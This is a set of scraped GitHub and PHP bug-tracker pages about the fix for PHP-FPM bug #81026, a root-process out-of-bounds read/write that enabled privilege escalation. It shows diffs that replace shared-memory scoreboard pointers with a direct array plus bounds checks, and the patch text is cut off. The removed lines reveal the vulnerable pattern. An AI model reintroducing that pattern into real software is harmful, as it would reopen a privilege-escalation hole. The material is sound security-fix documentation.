|  |  | memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | if (scoreboard->procs[child\_index].used > 0) { |
|  |  | memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | } |
|  |  |  |
|  |  | /\* set this slot as free to avoid search on next alloc \*/ |
|  |  | scoreboard->free\_proc = child\_index; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/ |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | int i = -1; |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int nprocs = wp->config->pm\_max\_children; |
|  |  |  |
|  |  | if (!scoreboard || !child\_index) { |
|  |  | if (!scoreboard) { |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | /\* first try the slot which is supposed to be free \*/ |
|  |  | if (scoreboard->free\_proc >= 0 && (unsigned int)scoreboard->free\_proc < scoreboard->nprocs) { |
|  |  | if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) { |
|  |  | if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) { |
|  |  | if (!scoreboard->procs[scoreboard->free\_proc].used) { |
|  |  | i = scoreboard->free\_proc; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/ |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool); |
|  |  | for (i = 0; i < (int)scoreboard->nprocs; i++) { |
|  |  | if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/ |
|  |  | for (i = 0; i < nprocs; i++) { |
|  |  | if (!scoreboard->procs[i].used) { /\* found \*/ |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\* no free slot \*/ |
|  |  | if (i < 0 || i >= (int)scoreboard->nprocs) { |
|  |  | if (i < 0 || i >= nprocs) { |
|  |  | zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool); |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard->procs[i]->used = 1; |
|  |  | \*child\_index = i; |
|  |  | scoreboard->procs[i].used = 1; |
|  |  | child->scoreboard\_i = i; |
|  |  |  |
|  |  | /\* supposed next slot is free \*/ |
|  |  | if (i + 1 >= (int)scoreboard->nprocs) { |
|  |  | if (i + 1 >= nprocs) { |
|  |  | scoreboard->free\_proc = 0; |
|  |  | } else { |
|  |  | scoreboard->free\_proc = i + 1; |
| Expand Down | |  |

11 changes: 6 additions & 5 deletions

11
[sapi/fpm/fpm/fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23 "sapi/fpm/fpm/fpm_scoreboard.h")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_scoreboard.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -63,7 +63,7 @@ struct fpm\_scoreboard\_s { |
|  |  | unsigned int nprocs; |
|  |  | int free\_proc; |
|  |  | unsigned long int slow\_rq; |
|  |  | struct fpm\_scoreboard\_proc\_s \*procs[]; |
|  |  | struct fpm\_scoreboard\_proc\_s procs[]; |
|  |  | }; |
|  |  |  |
|  |  | int fpm\_scoreboard\_init\_main(); |
| Expand All | | @@ -72,18 +72,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp); |
|  |  | void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get(); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang); |
|  |  | void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang); |
|  |  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc); |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard); |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp); |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid); |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid); |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index); |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child); |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child); |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
|  |  | float fpm\_scoreboard\_get\_tick(); |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5 "sapi/fpm/fpm/fpm_status.c")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_status.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -498,10 +498,10 @@ int fpm\_status\_handle\_request(void) /\* {{{ \*/ |
|  |  |  |
|  |  | first = 1; |
|  |  | for (i=0; i<scoreboard\_p->nprocs; i++) { |
|  |  | if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) { |
|  |  | if (!scoreboard\_p->procs[i].used) { |
|  |  | continue; |
|  |  | } |
|  |  | proc = \*scoreboard\_p->procs[i]; |
|  |  | proc = scoreboard\_p->procs[i]; |
|  |  |  |
|  |  | if (first) { |
|  |  | first = 0; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[sapi/fpm/fpm/fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42 "sapi/fpm/fpm/fpm_worker_pool.c")

Show comments

[View file](/php/php-src/blob/cb2021e5f69da5e2868130a05bb53db0f9f89e4b/sapi/fpm/fpm/fpm_worker_pool.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -54,7 +54,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/ |
|  |  | fpm\_worker\_pool\_config\_free(wp->config); |
|  |  | fpm\_children\_free(wp->children); |
|  |  | if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) { |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  | fpm\_worker\_pool\_free(wp); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `cb2021e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fcb2021e5f69da5e2868130a05bb53db0f9f89e4b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2dd2a235_20250115_115350.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7614)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7614)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal… #7614

 Closed

[cmb69](/cmb69)
wants to merge
1
commit into
[php:PHP-7.3](/php/php-src/tree/PHP-7.3 "php/php-src:PHP-7.3")
from
[cmb69:cmb/81026](/cmb69/php-src/tree/cmb/81026 "cmb69/php-src:cmb/81026")

 Closed

# [Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…](#top) #7614

[cmb69](/cmb69)
wants to merge
1
commit into
[php:PHP-7.3](/php/php-src/tree/PHP-7.3 "php/php-src:PHP-7.3")
from
[cmb69:cmb/81026](/cmb69/php-src/tree/cmb/81026 "cmb69/php-src:cmb/81026")

[Conversation
0](/php/php-src/pull/7614)
[Commits
1](/php/php-src/pull/7614/commits)
[Checks
0](/php/php-src/pull/7614/checks)
[Files changed](/php/php-src/pull/7614/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![cmb69](https://avatars.githubusercontent.com/u/2306138?s=60&v=4)](/cmb69)

Copy link

Member

### @cmb69 **[cmb69](/cmb69)** commented [Oct 26, 2021](#issue-1036031299)

…ation)

The main change is to store scoreboard procs directly to the variable sized

array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev stas@php.net

(cherry picked from commit [cb2021e](https://github.com/php/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b))

---

This is about backporting that bug fix to PHP-7.3 as suggested by several core devs (see bug ticket). If desired, I can tag PHP 7.3.32 today or tomorrow. And of course, we could have a patch release in some months, if any regression shows up.

[@smalyshev](https://github.com/smalyshev), [@bukka](https://github.com/bukka), thoughts?

Sorry, something went wrong.

All reactions

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka) [![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69)

`[Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…](/php/php-src/pull/7614/commits/e28225f76caabcdf210b05bd19cbf4380c3169ac "Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escalation)

The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev <stas@php.net>
(cherry picked from commit cb2021e5f69da5e2868130a05bb53db0f9f89e4b)")`
 …

`[e28225f](/php/php-src/pull/7614/commits/e28225f76caabcdf210b05bd19cbf4380c3169ac)`

```
…ation)

The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev <stas@php.net>
(cherry picked from commit [cb2021e](https://github.com/cmb69/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b))
```

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
added
the
[Bug](/php/php-src/labels/Bug)
label
[Oct 26, 2021](#event-5519024936)

[![@remicollet](https://avatars.githubusercontent.com/u/270445?s=40&v=4)](/remicollet)
[remicollet](/remicollet)
added
[SAPI: fpm](/php/php-src/labels/SAPI%3A%20fpm)
[Security](/php/php-src/labels/Security)
labels
[Oct 26, 2021](#event-5519244901)

[![bukka](https://avatars.githubusercontent.com/u/137594?s=60&v=4)](/bukka)

**[bukka](/bukka)**
approved these changes
[Oct 26, 2021](#pullrequestreview-789147565)

 [View reviewed changes](/php/php-src/pull/7614/files/e28225f76caabcdf210b05bd19cbf4380c3169ac)

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
closed this
in
`[f47798e](/php/php-src/commit/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a)`
[Oct 26, 2021](#event-5520968121)

 [![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)
[cmb69](/cmb69)
deleted the
cmb/81026

branch
[October 26, 2021 14:12](#event-5520972469)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F7614)

Reviewers

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka) [bukka](/bukka)

bukka approved these changes

Assignees

No one assigned

Labels

[Bug](/php/php-src/labels/Bug)
[SAPI: fpm](/php/php-src/labels/SAPI%3A%20fpm)
[Security](/php/php-src/labels/Security)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=52&v=4)](/cmb69) [![@bukka](https://avatars.githubusercontent.com/u/137594?s=52&v=4)](/bukka) [![@remicollet](https://avatars.githubusercontent.com/u/270445?s=52&v=4)](/remicollet)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_a458ccd2_20250115_115351.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Return to Bug #81026](bug.php?id=81026) | | --- | | Patch [fpm\_scoreboard\_proc\_oob\_fix\_v4.patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=latest) | revision [2021-10-10 19:20 UTC](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v3.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=latest) | revision [2021-05-31 21:55 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v2.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=latest) | revision [2021-05-31 21:16 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v1.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=latest) | revision [2021-05-31 13:32 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931&display=1) by bukka@php.net |  Patch fpm\_scoreboard\_proc\_oob\_fix\_v4.patch for FPM related Bug #81026 **Patch version 2021-10-10 19:20 UTC** [Return to Bug #81026](bug.php?id=81026) | [Download this patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616&download=1) Patch Revisions:  * [2021-10-10 19:20 UTC](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616) [[diff to current]](patch-display.php?patch=fpm_scoreboard_proc_oob_fix_v4.patch&bug_id=81026&diff=1&old=1633893616&revision=1633893616)  Developer: bukka@php.net ```  From c600ec7bcf2696882ffe961e7b158c67aa2e7277 Mon Sep 17 00:00:00 2001 From: Jakub Zelenka <bukka@php.net> Date: Sat, 2 Oct 2021 22:53:41 +0100 Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to  priv escalatio)  The main change is to store scoreboard procs directly to the variable sized array rather than indirectly through the pointer. ---  sapi/fpm/fpm/fpm_children.c    |  14 ++---  sapi/fpm/fpm/fpm_request.c     |   4 +-  sapi/fpm/fpm/fpm_scoreboard.c  | 106 ++++++++++++++++++++-------------  sapi/fpm/fpm/fpm_scoreboard.h  |  11 ++--  sapi/fpm/fpm/fpm_status.c      |   4 +-  sapi/fpm/fpm/fpm_worker_pool.c |   2 +-  6 files changed, 81 insertions(+), 60 deletions(-)  diff --git a/sapi/fpm/fpm/fpm_children.c b/sapi/fpm/fpm/fpm_children.c index fd121372f3..912f77c11a 100644 --- a/sapi/fpm/fpm/fpm_children.c +++ b/sapi/fpm/fpm/fpm_children.c @@ -246,7 +246,7 @@ void fpm_children_bury() /* {{{ */    			fpm_child_unlink(child);   -			fpm_scoreboard_proc_free(wp->scoreboard, child->scoreboard_i); +			fpm_scoreboard_proc_free(child);    			fpm_clock_get(&tv1);   @@ -256,9 +256,9 @@ void fpm_children_bury() /* {{{ */  				if (!fpm_pctl_can_spawn_children()) {  					severity = ZLOG_DEBUG;  				} -				zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv_sec, (int) tv2.tv_usec); +				zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv_sec, (int) tv2.tv_usec);  			} else { -				zlog(ZLOG_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv_sec, (int) tv2.tv_usec); +				zlog(ZLOG_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv_sec, (int) tv2.tv_usec);  			}    			fpm_child_close(child, 1 /* in event_loop */); @@ -324,7 +324,7 @@ static struct fpm_child_s *fpm_resources_prepare(struct fpm_worker_pool_s *wp) /  		return 0;  	}   -	if (0 > fpm_scoreboard_proc_alloc(wp->scoreboard, &c->scoreboard_i)) { +	if (0 > fpm_scoreboard_proc_alloc(c)) {  		fpm_stdio_discard_pipes(c);  		fpm_child_free(c);  		return 0; @@ -336,7 +336,7 @@ static struct fpm_child_s *fpm_resources_prepare(struct fpm_worker_pool_s *wp) /    static void fpm_resources_discard(struct fpm_child_s *child) /* {{{ */  { -	fpm_scoreboard_proc_free(child->wp->scoreboard, child->scoreboard_i); +	fpm_scoreboard_proc_free(child);  	fpm_stdio_discard_pipes(child);  	fpm_child_free(child);  } @@ -349,10 +349,10 @@ static void fpm_child_resources_use(struct fpm_child_s *child) /* {{{ */  		if (wp == child->wp) {  			continue;  		} -		fpm_scoreboard_free(wp->scoreboard); +		fpm_scoreboard_free(wp);  	}   -	fpm_scoreboard_child_use(child->wp->scoreboard, child->scoreboard_i, getpid()); +	fpm_scoreboard_child_use(child, getpid());  	fpm_stdio_child_use_pipes(child);  	fpm_child_free(child);  } diff --git a/sapi/fpm/fpm/fpm_request.c b/sapi/fpm/fpm/fpm_request.c index c80aa14462..0a6f6a7cfb 100644 --- a/sapi/fpm/fpm/fpm_request.c +++ b/sapi/fpm/fpm/fpm_request.c @@ -285,7 +285,7 @@ int fpm_request_is_idle(struct fpm_child_s *child) /* {{{ */  	struct fpm_scoreboard_proc_s *proc;    	/* no need in atomicity here */ -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return 0;  	} @@ -300,7 +300,7 @@ int fpm_request_last_activity(struct fpm_child_s *child, struct timeval *tv) /*    	if (!tv) return -1;   -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return -1;  	} diff --git a/sapi/fpm/fpm/fpm_scoreboard.c b/sapi/fpm/fpm/fpm_scoreboard.c index 328f999f0c..7e9da4d684 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.c +++ b/sapi/fpm/fpm/fpm_scoreboard.c @@ -6,6 +6,7 @@  #include <time.h>    #include "fpm_config.h" +#include "fpm_children.h"  #include "fpm_scoreboard.h"  #include "fpm_shm.h"  #include "fpm_sockets.h" @@ -23,7 +24,6 @@ static float fpm_scoreboard_tick;  int fpm_scoreboard_init_main() /* {{{ */  {  	struct fpm_worker_pool_s *wp; -	unsigned int i;    #ifdef HAVE_TIMES  #if (defined(HAVE_SYSCONF) && defined(_SC_CLK_TCK)) @@ -40,7 +40,7 @@ int fpm_scoreboard_init_main() /* {{{ */      	for (wp = fpm_worker_all_pools; wp; wp = wp->next) { -		size_t scoreboard_size, scoreboard_nprocs_size; +		size_t scoreboard_procs_size;  		void *shm_mem;    		if (wp->config->pm_max_children < 1) { @@ -53,22 +53,15 @@ int fpm_scoreboard_init_main() /* {{{ */  			return -1;  		}   -		scoreboard_size        = sizeof(struct fpm_scoreboard_s) + (wp->config->pm_max_children) * sizeof(struct fpm_scoreboard_proc_s *); -		scoreboard_nprocs_size = sizeof(struct fpm_scoreboard_proc_s) * wp->config->pm_max_children; -		shm_mem                = fpm_shm_alloc(scoreboard_size + scoreboard_nprocs_size); +		scoreboard_procs_size = sizeof(struct fpm_scoreboard_proc_s) * wp->config->pm_max_children; +		shm_mem = fpm_shm_alloc(sizeof(struct fpm_scoreboard_s) + scoreboard_procs_size);    		if (!shm_mem) {  			return -1;  		} -		wp->scoreboard         = shm_mem; +		wp->scoreboard = shm_mem; +		wp->scoreboard->pm = wp->config->pm;  		wp->scoreboard->nprocs = wp->config->pm_max_children; -		shm_mem               += scoreboard_size; - -		for (i = 0; i < wp->scoreboard->nprocs; i++, shm_mem += sizeof(struct fpm_scoreboard_proc_s)) { -			wp->scoreboard->procs[i] = shm_mem; -		} - -		wp->scoreboard->pm          = wp->config->pm;  		wp->scoreboard->start_epoch = time(NULL);  		strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool));  	} @@ -162,28 +155,48 @@ struct fpm_scoreboard_s *fpm_scoreboard_get() /* {{{*/  }  /* }}} */   -struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index) /* {{{*/ +static inline struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_ex( +		struct fpm_scoreboard_s *scoreboard, int child_index, unsigned int nprocs) /* {{{*/  {  	if (!scoreboard) { -		scoreboard = fpm_scoreboard; +		return NULL;  	}   -	if (!scoreboard) { +	if (child_index < 0 || (unsigned int)child_index >= nprocs) {  		return NULL;  	}   +	return &scoreboard->procs[child_index]; +} +/* }}} */ + +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get( +		struct fpm_scoreboard_s *scoreboard, int child_index) /* {{{*/ +{ +	if (!scoreboard) { +		scoreboard = fpm_scoreboard; +	} +  	if (child_index < 0) {  		child_index = fpm_scoreboard_i;  	}   -	if (child_index < 0 || (unsigned int)child_index >= scoreboard->nprocs) { -		return NULL; -	} +	return fpm_scoreboard_proc_get_ex(scoreboard, 